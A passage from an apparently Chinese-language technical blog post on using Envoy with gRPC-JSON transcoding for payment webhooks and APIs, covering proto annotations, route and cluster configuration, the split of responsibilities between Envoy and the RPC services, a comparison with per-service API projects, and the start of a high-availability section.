    option (google.api.http) = {
      post: <span class="hljs-string">"/api/v2/payment/webhook/stripe/{account_id}"</span>  // POST 方法，路径参数
      body: <span class="hljs-string">"*"</span>  // 请求体映射到消息的所有字段
    };
  };
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>post:</code> 定义 HTTP POST 方法</li>
<li><code>{account_id}</code> 是路径参数，会自动映射到 <code>HandleWebhookReq.account_id</code> 字段</li>
<li><code>body: "*"</code> 表示请求体映射到消息的所有字段</li>
</ul>
<h4 data-id="heading-26">步骤 2：编译生成 pb 文件</h4>
<pre><code class="hljs language-bash" lang="bash">./build-proto.sh
</code></pre>
<h4 data-id="heading-27">步骤 3：在 envoy.yaml 中添加路由</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">routes:</span>
  <span class="hljs-comment"># Stripe Webhook 路由</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">"/api/v2/payment/webhook/stripe/{account_id}"</span>
      <span class="hljs-attr">headers:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">":method"</span>
          <span class="hljs-attr">exact_match:</span> <span class="hljs-string">"POST"</span>
    <span class="hljs-attr">route:</span>
      <span class="hljs-attr">cluster:</span> <span class="hljs-string">payment_stripe_grpc</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>路径必须与 proto 注解中的路径一致</li>
<li>可以限制 HTTP 方法为 POST</li>
<li>路径参数 <code>{account_id}</code> 会被自动提取</li>
</ul>
<h3 data-id="heading-28">3.3 修改服务地址</h3>
<p><strong>场景</strong>：切换环境或服务地址变更</p>
<p><strong>操作步骤</strong>：</p>
<p>直接修改 <code>clusters</code> 中的 <code>address</code> 和 <code>port_value</code>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-attr">load_assignment:</span>
      <span class="hljs-attr">cluster_name:</span> <span class="hljs-string">payment_gateway_grpc</span>
      <span class="hljs-attr">endpoints:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">lb_endpoints:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">endpoint:</span>
                <span class="hljs-attr">address:</span>
                  <span class="hljs-attr">socket_address:</span>
                    <span class="hljs-attr">address:</span> <span class="hljs-string">新地址</span>  <span class="hljs-comment"># 修改这里</span>
                    <span class="hljs-attr">port_value:</span> <span class="hljs-string">新端口</span>  <span class="hljs-comment"># 修改这里</span>
</code></pre>
<h3 data-id="heading-29">3.4 配置调整操作</h3>
<h4 data-id="heading-30">调整超时时间</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">routes:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">"/api/v1/payment/channels"</span>
    <span class="hljs-attr">route:</span>
      <span class="hljs-attr">cluster:</span> <span class="hljs-string">payment_gateway_grpc</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">10s</span>  <span class="hljs-comment"># 从 5s 调整为 10s</span>
</code></pre>
<h4 data-id="heading-31">调整连接超时</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-attr">connect_timeout:</span> <span class="hljs-string">10s</span>  <span class="hljs-comment"># 从 5s 调整为 10s</span>
</code></pre>
<h4 data-id="heading-32">添加负载均衡配置</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-attr">circuit_breakers:</span>
      <span class="hljs-attr">thresholds:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">max_connections:</span> <span class="hljs-number">1000</span>
          <span class="hljs-attr">max_pending_requests:</span> <span class="hljs-number">1000</span>
          <span class="hljs-attr">max_requests:</span> <span class="hljs-number">1000</span>
</code></pre>
<hr/>
<h2 data-id="heading-33">四、架构设计原则：Envoy 的职责边界</h2>
<h3 data-id="heading-34">4.1 核心原则</h3>
<p><strong>所有业务逻辑都应该在 RPC 服务中处理，Envoy 仅做透传和协议转换是最佳实践。</strong></p>
<h3 data-id="heading-35">4.2 Envoy 应该做什么（职责范围）</h3>
<h4 data-id="heading-36">4.2.1 协议转换</h4>
<p><strong>职责</strong>：</p>
<ul>
<li>HTTP/JSON → gRPC 协议转换</li>
<li>gRPC → HTTP/JSON 协议转换</li>
<li>路径参数映射（URL 路径参数 → gRPC 消息字段）</li>
<li>请求体映射（HTTP Body → gRPC 消息）</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ul>
<li>使用 gRPC-JSON Transcoding 过滤器</li>
<li>基于 proto 文件中的 HTTP 注解自动转换</li>
</ul>
<h4 data-id="heading-37">4.2.2 路由和负载均衡</h4>
<p><strong>职责</strong>：</p>
<ul>
<li>根据路径匹配路由到不同的 gRPC 服务</li>
<li>负载均衡（多个 gRPC 服务实例）</li>
<li>故障转移和重试</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ul>
<li>Router Filter 处理路由</li>
<li>Cluster 配置处理负载均衡</li>
</ul>
<h4 data-id="heading-38">4.2.3 基础设施功能</h4>
<p><strong>职责</strong>：</p>
<ul>
<li>连接管理（连接池、超时）</li>
<li>健康检查</li>
<li>熔断器</li>
<li>统计和监控</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ul>
<li>Envoy 内置功能，通过配置启用</li>
</ul>
<h3 data-id="heading-39">4.3 Envoy 不应该做什么（职责边界）</h3>
<h4 data-id="heading-40">4.3.1 业务逻辑处理</h4>
<p><strong>不应该做</strong>：</p>
<ul>
<li>❌ 签名验证</li>
<li>❌ 参数验证（业务规则）</li>
<li>❌ 数据转换（业务格式转换）</li>
<li>❌ 权限检查</li>
<li>❌ 业务规则判断</li>
</ul>
<p><strong>原因</strong>：</p>
<ul>
<li>业务逻辑应该在 RPC 服务中处理，便于测试和维护</li>
<li>Envoy 层处理业务逻辑会增加配置复杂度</li>
<li>业务逻辑变更需要修改 Envoy 配置，耦合度高</li>
</ul>
<h4 data-id="heading-41">4.3.2 数据转换（业务格式）</h4>
<p><strong>不应该做</strong>：</p>
<ul>
<li>❌ 响应格式转换（如 <code>baseModel</code> → <code>code/msg</code>）</li>
<li>❌ 数据字段映射</li>
<li>❌ 业务数据格式化</li>
</ul>
<p><strong>原因</strong>：</p>
<ul>
<li>如果使用 Lua 过滤器做响应格式转换，说明 gRPC 服务返回的格式不符合要求</li>
<li><strong>最佳实践</strong>：gRPC 服务直接返回符合 API 要求的格式，无需转换</li>
</ul>
<p><strong>替代方案</strong>：</p>
<ul>
<li>gRPC 服务统一返回格式：<code>{code, msg, data}</code></li>
<li>移除 Lua 过滤器，Envoy 只做协议转换</li>
</ul>
<h3 data-id="heading-42">4.4 RPC 服务应该处理什么</h3>
<h4 data-id="heading-43">4.4.1 所有业务逻辑</h4>
<p><strong>必须处理</strong>：</p>
<ol start="34">
<li>
<p><strong>签名验证</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *PaymentStripeService)</span></span> HandleWebhook(ctx context.Context, req *pb.HandleWebhookReq) (*pb.HandleWebhookResp, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 从 Metadata 获取 signature</span>
    md, _ := metadata.FromIncomingContext(ctx)
    signature := <span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> values := md.Get(<span class="hljs-string">"stripe-signature"</span>); <span class="hljs-built_in">len</span>(values) &gt; <span class="hljs-number">0</span> {
        signature = values[<span class="hljs-number">0</span>]
    }
    
    <span class="hljs-comment">// 验证 Stripe 签名</span>
    <span class="hljs-keyword">if</span> err := s.verifyStripeSignature(req.Payload, signature, req.AccountId); err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> &amp;pb.HandleWebhookResp{
            Code: <span class="hljs-number">400</span>,
            Msg: <span class="hljs-string">"签名验证失败"</span>,
        }, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-comment">// 处理业务逻辑...</span>
}
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>参数验证</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *PaymentGatewayService)</span></span> CreatePayment(ctx context.Context, req *pb.CreatePaymentReq) (*pb.CreatePaymentResp, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 参数验证</span>
    <span class="hljs-keyword">if</span> req.Amount &lt;= <span class="hljs-number">0</span> {
        <span class="hljs-keyword">return</span> &amp;pb.CreatePaymentResp{
            Code: <span class="hljs-number">400</span>,
            Msg: <span class="hljs-string">"金额必须大于 0"</span>,
        }, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-comment">// 业务逻辑验证</span>
    <span class="hljs-keyword">if</span> err := s.validatePayment(req); err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> &amp;pb.CreatePaymentResp{
            Code: <span class="hljs-number">400</span>,
            Msg: err.Error(),
        }, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-comment">// 处理业务逻辑...</span>
}
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>权限检查</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *PaymentGatewayService)</span></span> GetPayment(ctx context.Context, req *pb.GetPaymentReq) (*pb.GetPaymentResp, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 权限检查</span>
    <span class="hljs-keyword">if</span> !s.hasPermission(ctx, req.MerchantId) {
        <span class="hljs-keyword">return</span> &amp;pb.GetPaymentResp{
            Code: <span class="hljs-number">403</span>,
            Msg: <span class="hljs-string">"无权限访问"</span>,
        }, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-comment">// 处理业务逻辑...</span>
}
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>统一响应格式</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *PaymentGatewayService)</span></span> ListChannels(ctx context.Context, req *pb.ListChannelsReq) (*pb.ListChannelsResp, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 业务逻辑处理</span>
    channels, err := s.getChannels()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> &amp;pb.ListChannelsResp{
            Code: <span class="hljs-number">500</span>,
            Msg: err.Error(),
            Data: <span class="hljs-literal">nil</span>,
        }, <span class="hljs-literal">nil</span>
    }
    
    <span class="hljs-comment">// 直接返回符合 API 要求的格式</span>
    <span class="hljs-keyword">return</span> &amp;pb.ListChannelsResp{
        Code: <span class="hljs-number">200</span>,
        Msg: <span class="hljs-string">"success"</span>,
        Data: channels,  <span class="hljs-comment">// 直接使用 data 字段，而不是 channels</span>
    }, <span class="hljs-literal">nil</span>
}
</code></pre>
</li>
</ol>
</li>
</ol>
<h4 data-id="heading-44">4.4.2 错误处理</h4>
<p><strong>必须处理</strong>：</p>
<ul>
<li>所有错误都通过响应消息返回，而不是 gRPC 错误</li>
<li>统一的错误码和错误消息格式</li>
<li>详细的错误信息（便于调试）</li>
</ul>
<h3 data-id="heading-45">4.5 响应格式处理范围</h3>
<h4 data-id="heading-46">4.5.1 需要统一响应格式的方法</h4>
<p><strong>仅处理有 HTTP 注解的 RPC 方法</strong>：</p>
<p>这些方法需要通过 Envoy 暴露为 HTTP API，响应格式需要统一为 <code>{code, msg, data}</code>：</p>
<pre><code class="hljs language-scss" lang="scss">service PaymentGateway {
  <span class="hljs-comment">// ✅ 有 HTTP 注解，需要统一响应格式</span>
  rpc <span class="hljs-built_in">ListChannels</span>(ListChannelsReq) returns (ListChannelsResp) {
    option (google.api.http) = {
      get: <span class="hljs-string">"/api/v1/payment/channels"</span>
    };
  };
}

service PaymentStripe {
  <span class="hljs-comment">// ✅ 有 HTTP 注解，需要统一响应格式</span>
  rpc <span class="hljs-built_in">HandleWebhook</span>(HandleWebhookReq) returns (HandleWebhookResp) {
    option (google.api.http) = {
      post: <span class="hljs-string">"/api/v2/payment/webhook/stripe/{account_id}"</span>
    };
  };
}
</code></pre>
<p><strong>处理方式</strong>：</p>
<ul>
<li>修改 proto 文件，响应消息使用 <code>{code, msg, data}</code> 格式</li>
<li>在 RPC 服务实现中直接返回统一格式</li>
<li>无需 Lua 过滤器转换</li>
</ul>
<h4 data-id="heading-47">4.5.2 不需要统一响应格式的方法</h4>
<p><strong>仅用于内部 gRPC 调用的方法</strong>：</p>
<p>这些方法没有 HTTP 注解，仅用于服务间 gRPC 调用，可以保持原有格式：</p>
<pre><code class="hljs language-scss" lang="scss">service PaymentGateway {
  <span class="hljs-comment">// ❌ 无 HTTP 注解，仅内部调用，可以保持 baseModel 格式</span>
  rpc <span class="hljs-built_in">CreatePayment</span>(CreatePaymentReq) returns (CreatePaymentResp);
  rpc <span class="hljs-built_in">GetPayment</span>(GetPaymentReq) returns (GetPaymentResp);
  rpc <span class="hljs-built_in">CancelPayment</span>(CancelPaymentReq) returns (CancelPaymentResp);
}
</code></pre>
<p><strong>处理方式</strong>：</p>
<ul>
<li>保持原有响应格式（如 <code>baseModel</code>）</li>
<li>无需修改</li>
<li>不影响 Envoy 配置</li>
</ul>
<h4 data-id="heading-48">4.5.3 判断标准</h4>
<p><strong>判断是否需要统一响应格式</strong>：</p>
<ul>
<li>✅ 有 <code>option (google.api.http)</code> 注解 → 需要统一格式</li>
<li>❌ 无 HTTP 注解 → 可以保持原有格式</li>
</ul>
<p><strong>总结</strong>：</p>
<ul>
<li><strong>只需要处理需要通过 Envoy 转换的 RPC 的响应参数</strong></li>
<li>内部 gRPC 调用方法无需修改响应格式</li>
</ul>
<h3 data-id="heading-49">4.6 最佳实践总结</h3>
<h4 data-id="heading-50">4.6.1 职责划分</h4>




















<table><thead><tr><th>组件</th><th>职责</th><th>示例</th></tr></thead><tbody><tr><td><strong>Envoy</strong></td><td>协议转换、路由、负载均衡</td><td>HTTP → gRPC、路径匹配</td></tr><tr><td><strong>RPC 服务</strong></td><td>所有业务逻辑</td><td>签名验证、参数验证、业务处理</td></tr></tbody></table>
<h4 data-id="heading-51">4.6.2 架构设计原则</h4>
<ol start="38">
<li>
<p><strong>Envoy 做透传和转换</strong>：</p>
<ol>
<li>✅ 协议转换（HTTP ↔ gRPC）</li>
<li>✅ 路由和负载均衡</li>
<li>✅ 基础设施功能（健康检查、熔断等）</li>
<li>❌ 不做业务逻辑处理</li>
</ol>
</li>
<li>
<p><strong>RPC 服务处理所有业务逻辑</strong>：</p>
<ol>
<li>✅ 签名验证</li>
<li>✅ 参数验证</li>
<li>✅ 权限检查</li>
<li>✅ 业务规则判断</li>
<li>✅ 统一响应格式（仅针对有 HTTP 注解的方法）</li>
</ol>
</li>
<li>
<p><strong>响应格式统一在 RPC 服务层</strong>：</p>
<ol>
<li>✅ <strong>仅处理需要通过 Envoy 转换为 HTTP API 的 RPC 方法</strong></li>
<li>✅ 这些方法的响应格式统一为 <code>{code, msg, data}</code></li>
<li>✅ 内部 gRPC 调用（无 HTTP 注解）的方法可以保持原有格式</li>
<li>✅ 无需 Lua 过滤器转换</li>
<li>✅ Envoy 只做协议转换，不做格式转换</li>
</ol>
</li>
</ol>
<h4 data-id="heading-52">4.6.3 实施建议</h4>
<p><strong>阶段 1：当前状态（使用 Lua）</strong> ：</p>
<ul>
<li>Envoy：协议转换 + 响应格式转换（Lua）</li>
<li>RPC 服务：业务逻辑处理</li>
</ul>
<p><strong>阶段 2：目标状态（移除 Lua）</strong> ：</p>
<ul>
<li>Envoy：仅协议转换</li>
<li>RPC 服务：业务逻辑 + 统一响应格式</li>
</ul>
<p><strong>迁移步骤</strong>：</p>
<ol start="41">
<li><strong>识别需要通过 Envoy 暴露的 RPC 方法</strong>（有 <code>google.api.http</code> 注解的）</li>
<li><strong>仅统一这些方法的响应格式</strong>为 <code>{code, msg, data}</code></li>
<li><strong>内部 gRPC 调用方法</strong>（无 HTTP 注解）可以保持原有格式（如 <code>baseModel</code>）</li>
<li>移除 Envoy 中的 Lua 过滤器</li>
<li>验证所有接口正常工作</li>
</ol>
<hr/>
<h2 data-id="heading-53">五、使用 Envoy 的优势分析</h2>
<h3 data-id="heading-54">5.1 统一入口管理</h3>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>单一配置点</strong>：所有 webhook 和 API 接口在一个 <code>envoy.yaml</code> 文件中管理</li>
<li><strong>统一路由规则</strong>：路由、超时、重试等策略统一配置</li>
<li><strong>集中监控</strong>：通过 Envoy Admin 接口统一查看所有服务的统计信息</li>
</ul>
<p><strong>对比</strong>：如果每个服务都搭建独立的 API 项目，需要：</p>
<ul>
<li>每个项目独立配置</li>
<li>每个项目独立监控</li>
<li>配置分散，难以统一管理</li>
</ul>
<h3 data-id="heading-55">5.2 协议转换能力</h3>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>自动转换</strong>：gRPC-JSON Transcoding 自动将 HTTP/JSON 转换为 gRPC</li>
<li><strong>基于 Proto</strong>：转换规则基于 proto 文件，类型安全</li>
<li><strong>零代码</strong>：无需编写转换代码，只需配置</li>
</ul>
<p><strong>对比</strong>：如果每个服务都搭建独立的 API 项目，需要：</p>
<ul>
<li>手动编写 HTTP 到 gRPC 的转换代码</li>
<li>维护转换逻辑</li>
<li>处理类型转换错误</li>
</ul>
<h3 data-id="heading-56">5.3 维护成本</h3>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>Proto 驱动</strong>：proto 文件变更只需重新编译，无需修改代码</li>
<li><strong>配置即代码</strong>：所有配置都在 YAML 文件中，易于版本控制</li>
<li><strong>统一升级</strong>：Envoy 升级只需更新一个组件</li>
</ul>
<p><strong>对比</strong>：如果每个服务都搭建独立的 API 项目，需要：</p>
<ul>
<li>每个项目独立维护</li>
<li>每个项目独立升级</li>
<li>代码重复，维护成本高</li>
</ul>
<h3 data-id="heading-57">5.4 性能优势</h3>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>C++ 实现</strong>：Envoy 是 C++ 实现，性能优异</li>
<li><strong>HTTP/2 支持</strong>：原生支持 HTTP/2，连接复用</li>
<li><strong>高效转换</strong>：gRPC-JSON Transcoding 是编译时优化，性能好</li>
</ul>
<p><strong>对比</strong>：如果每个服务都搭建独立的 API 项目，需要：</p>
<ul>
<li>每个项目独立处理 HTTP 请求</li>
<li>可能使用性能较低的框架</li>
<li>资源消耗更大</li>
</ul>
<h3 data-id="heading-58">5.5 扩展性</h3>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>易于扩展</strong>：添加新服务只需修改配置，无需新建项目</li>
<li><strong>统一标准</strong>：所有服务遵循相同的接口标准</li>
<li><strong>灵活路由</strong>：支持复杂的路由规则和负载均衡</li>
</ul>
<p><strong>对比</strong>：如果每个服务都搭建独立的 API 项目，需要：</p>
<ul>
<li>每个新服务都需要新建项目</li>
<li>项目间可能标准不一致</li>
<li>扩展成本高</li>
</ul>
<hr/>
<h2 data-id="heading-59">六、方案对比：Envoy vs 各自搭建 API 项目</h2>
<h3 data-id="heading-60">6.1 需求背景分析</h3>
<p><strong>需求特点</strong>：</p>
<ol start="46">
<li><strong>多个服务的 webhook 请求</strong>：Stripe、PayPal、GitHub 等</li>
<li><strong>部分需要 RPC 转换为 API 的接口</strong>：如 ListChannels、GetPayment 等</li>
<li><strong>服务数量可能持续增长</strong>：未来可能有更多 webhook 和 API 接口</li>
</ol>
<h3 data-id="heading-61">6.2 方案对比</h3>
<h4 data-id="heading-62">方案 A：使用 Envoy 统一代理</h4>
<p><strong>架构</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">HTTP <span class="hljs-built_in">Client</span>
    ↓
<span class="hljs-built_in">Envoy</span> (统一入口)
    ├─ Webhook 路由 → gRPC 服务
    ├─ API 路由 → gRPC 服务
    └─ 其他路由 → gRPC 服务
</code></pre>
<p><strong>优势</strong>：</p>
<ol start="49">
<li>
<p><strong>统一管理</strong></p>
<ol>
<li>单一配置文件管理所有路由</li>
<li>统一监控和统计</li>
<li>统一升级和维护</li>
</ol>
</li>
<li>
<p><strong>快速扩展</strong></p>
<ol>
<li>添加新服务只需修改配置</li>
<li>无需新建项目</li>
<li>配置即代码，易于版本控制</li>
</ol>
</li>
<li>
<p><strong>协议转换</strong></p>
<ol>
<li>自动 HTTP/JSON → gRPC 转换</li>
<li>基于 proto 文件，类型安全</li>
<li>零代码转换</li>
</ol>
</li>
<li>
<p><strong>性能优势</strong></p>
<ol>
<li>C++ 实现，性能优异</li>
<li>HTTP/2 支持，连接复用</li>
<li>高效的路由和负载均衡</li>
</ol>
</li>
<li>
<p><strong>标准化</strong></p>
<ol>
<li>所有服务遵循相同的接口标准</li>
<li>统一的错误处理和响应格式</li>
<li>易于团队协作</li>
</ol>
</li>
</ol>
<p><strong>劣势</strong>：</p>
<ol start="54">
<li>
<p><strong>学习成本</strong></p>
<ol>
<li>需要学习 Envoy 配置</li>
<li>需要理解 gRPC-JSON Transcoding</li>
</ol>
</li>
<li>
<p><strong>调试复杂度</strong></p>
<ol>
<li>问题可能出现在 Envoy 层或 gRPC 服务层</li>
<li>需要理解整个数据流</li>
</ol>
</li>
<li>
<p><strong>依赖 Envoy</strong></p>
<ol>
<li>如果 Envoy 出现问题，影响所有服务</li>
<li>需要维护 Envoy 配置</li>
</ol>
</li>
</ol>
<h4 data-id="heading-63">方案 B：每个服务各自搭建 API 项目</h4>
<p><strong>架构</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">HTTP <span class="hljs-built_in">Client</span>
    ├─ Stripe Webhook → Stripe API 项目 → Stripe gRPC 服务
    ├─ PayPal Webhook → PayPal API 项目 → PayPal gRPC 服务
    ├─ Payment API → Payment API 项目 → Payment gRPC 服务
    └─ 其他服务 → 各自的 API 项目 → 各自的 gRPC 服务
</code></pre>
<p><strong>优势</strong>：</p>
<ol start="57">
<li>
<p><strong>独立性</strong></p>
<ol>
<li>每个服务独立部署和升级</li>
<li>问题隔离，不影响其他服务</li>
<li>团队可以独立开发</li>
</ol>
</li>
<li>
<p><strong>灵活性</strong></p>
<ol>
<li>每个服务可以使用不同的技术栈</li>
<li>可以针对特定服务优化</li>
<li>不受统一框架限制</li>
</ol>
</li>
<li>
<p><strong>简单性</strong></p>
<ol>
<li>每个项目相对简单</li>
<li>不需要理解 Envoy 配置</li>
<li>调试相对容易</li>
</ol>
</li>
</ol>
<p><strong>劣势</strong>：</p>
<ol start="60">
<li>
<p><strong>重复代码</strong></p>
<ol>
<li>每个项目都需要实现 HTTP → gRPC 转换</li>
<li>每个项目都需要实现签名验证</li>
<li>每个项目都需要实现参数验证</li>
<li>代码重复，维护成本高</li>
</ol>
</li>
<li>
<p><strong>维护成本</strong></p>
<ol>
<li>每个项目独立维护</li>
<li>每个项目独立升级</li>
<li>配置分散，难以统一管理</li>
</ol>
</li>
<li>
<p><strong>扩展成本</strong></p>
<ol>
<li>每个新服务都需要新建项目</li>
<li>需要重复实现相同的功能</li>
<li>资源消耗更大</li>
</ol>
</li>
<li>
<p><strong>标准化困难</strong></p>
<ol>
<li>不同项目可能标准不一致</li>
<li>难以统一监控和统计</li>
<li>团队协作成本高</li>
</ol>
</li>
</ol>
<h3 data-id="heading-64">6.3 成本对比</h3>













































<table><thead><tr><th>维度</th><th>Envoy 方案</th><th>各自搭建 API 项目</th></tr></thead><tbody><tr><td><strong>初始开发</strong></td><td>低（只需配置）</td><td>高（每个项目都要开发）</td></tr><tr><td><strong>添加新服务</strong></td><td>低（修改配置）</td><td>高（新建项目）</td></tr><tr><td><strong>维护成本</strong></td><td>低（统一维护）</td><td>高（分散维护）</td></tr><tr><td><strong>代码重复</strong></td><td>无</td><td>高（每个项目重复）</td></tr><tr><td><strong>学习成本</strong></td><td>中（学习 Envoy）</td><td>低（使用熟悉框架）</td></tr><tr><td><strong>性能</strong></td><td>高（C++ 实现）</td><td>中（取决于框架）</td></tr><tr><td><strong>扩展性</strong></td><td>高（易于扩展）</td><td>低（需要新建项目）</td></tr></tbody></table>
<h3 data-id="heading-65">6.4 适用场景</h3>
<h4 data-id="heading-66">使用 Envoy 的场景</h4>
<ol start="64">
<li><strong>服务数量多</strong>：有多个 webhook 和 API 接口需要管理</li>
<li><strong>统一标准</strong>：希望所有服务遵循相同的接口标准</li>
<li><strong>快速扩展</strong>：需要频繁添加新服务</li>
<li><strong>性能要求高</strong>：对性能有较高要求</li>
<li><strong>团队协作</strong>：希望统一管理和监控</li>
</ol>
<h4 data-id="heading-67">各自搭建 API 项目的场景</h4>
<ol start="69">
<li><strong>服务数量少</strong>：只有 1-2 个服务</li>
<li><strong>独立性要求高</strong>：每个服务需要完全独立</li>
<li><strong>技术栈不同</strong>：不同服务需要使用不同的技术栈</li>
<li><strong>团队独立</strong>：不同团队独立开发，不需要统一管理</li>
</ol>
<h3 data-id="heading-68">6.5 基于需求背景的建议</h3>
<p><strong>基于您的需求背景</strong>：</p>
<ul>
<li>可能有很多服务的 webhook 请求</li>
<li>部分需要 RPC 转换为 API 的接口</li>
<li>服务数量可能持续增长</li>
</ul>
<p><strong>建议：使用 Envoy 方案</strong></p>
<p><strong>理由</strong>：</p>
<ol start="73">
<li>
<p><strong>符合需求特点</strong>：</p>
<ol>
<li>多个 webhook 服务可以通过 Envoy 统一管理</li>
<li>RPC 转 API 的需求可以通过 gRPC-JSON Transcoding 自动实现</li>
<li>服务数量增长时，只需修改配置，无需新建项目</li>
</ol>
</li>
<li>
<p><strong>成本效益高</strong>：</p>
<ol>
<li>初始开发成本低（只需配置）</li>
<li>维护成本低（统一维护）</li>
<li>扩展成本低（修改配置即可）</li>
</ol>
</li>
<li>
<p><strong>标准化优势</strong>：</p>
<ol>
<li>所有服务遵循相同的接口标准</li>
<li>统一的错误处理和响应格式</li>
<li>易于团队协作</li>
</ol>
</li>
<li>
<p><strong>性能优势</strong>：</p>
<ol>
<li>Envoy 是 C++ 实现，性能优异</li>
<li>HTTP/2 支持，连接复用</li>
<li>高效的路由和负载均衡</li>
</ol>
</li>
</ol>
<p><strong>实施建议</strong>：</p>
<ol start="77">
<li><strong>初期</strong>：使用 Envoy + Lua 过滤器（如果已有服务，不想改动）</li>
<li><strong>长期</strong>：逐步统一 gRPC 服务响应格式，移除 Lua 过滤器</li>
<li><strong>扩展</strong>：新服务直接使用统一的响应格式，无需 Lua 转换</li>
</ol>
<hr/>
<h2 data-id="heading-69">七、Envoy 高可用方案</h2>
<h3 data-id="heading-70">7.1 Envoy 实例高可用</h3>
<h4 data-id="heading-71">7.1.1 多实例部署</h4>
<p><strong>架构设计</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">                    ┌─────────────┐
                    │  负载均衡器  │
                    │  (Nginx/ALB) │
                    └──────┬──────┘
                           │
            ┌──────────────┼──────────────┐
            │              │              │
      ┌─────▼─────┐  ┌─────▼─────┐  ┌─────▼─────┐
      │  Envoy-1  │  │  Envoy-2  │  │  Envoy-3  │
      │  :2020    │  │  :2020    │  │  :2020    │
      └─────┬─────┘  └─────┬─────┘  └─────┬─────┘
            │              │              │
            └──────────────┼──────────────┘
                           │
                    ┌──────▼──────┐
                    │  gRPC 服务  │
                    └────────────┘
</span></code></pre>
<p><strong>部署方式</strong>：</p>
<ol start="80">
<li>
<p><strong>Kubernetes 部署</strong>（推荐）：</p>
<ol>
<li>使用 Deployment 部署多个 Envoy 实例（至少 3 个）</li>
<li>使用 Service 暴露服务，支持 LoadBalancer 或 Ingress</li>
<li>通过 ConfigMap 管理配置文件</li>
<li>支持自动扩缩容和滚动更新</li>
</ol>
</li>
<li>
<p><strong>Docker Compose 多实例</strong>：</p>
<ol>
<li>启动多个 Envoy 容器实例</li>
<li>每个实例使用不同的端口映射</li>
<li>共享相同的配置文件和 proto 文件</li>
</ol>
</li>
<li>
<p><strong>直接部署</strong>：</p>
<ol>
<li>在多台服务器上直接运行 Envoy 进程</li>
<li>使用 systemd 或 supervisor 管理进程</li>
<li>通过负载均衡器（Nginx、HAProxy）分发流量</li>
</ol>
</li>
</ol>
<h4 data-id="heading-72">7.1.2 负载均衡配置</h4>
<p><strong>前端负载均衡器选择</strong>：</p>
<ol start="83">
<li>
<p><strong>Nginx</strong>：</p>
<ol>
<li>配置 upstream 指向多个 Envoy 实例</li>
<li>支持健康检查和故障转移</li>
<li>使用 least_conn 或 ip_hash 负载均衡策略</li>
</ol>
</li>
<li>
<p><strong>云服务负载均衡器</strong>：</p>
<ol>
<li>AWS ALB / Application Load Balancer</li>
<li>阿里云 SLB / Server Load Balancer</li>
<li>腾讯云 CLB / Cloud Load Balancer</li>
<li>配置多个 Envoy 实例作为后端</li>
<li>启用健康检查（检查 <code>/healthz</code> 或 <code>/server_info</code>）</li>
<li>支持会话保持（如需要）</li>
</ol>
</li>
<li>
<p><strong>HAProxy</strong>：</p>
<ol>
<li>配置多个 Envoy 后端服务器</li>
<li>支持健康检查和负载均衡算法</li>
</ol>
</li>
</ol>
<h3 data-id="heading-73">7.2 上游服务高可用</h3>
<h4 data-id="heading-74">7.2.1 多实例集群配置</h4>
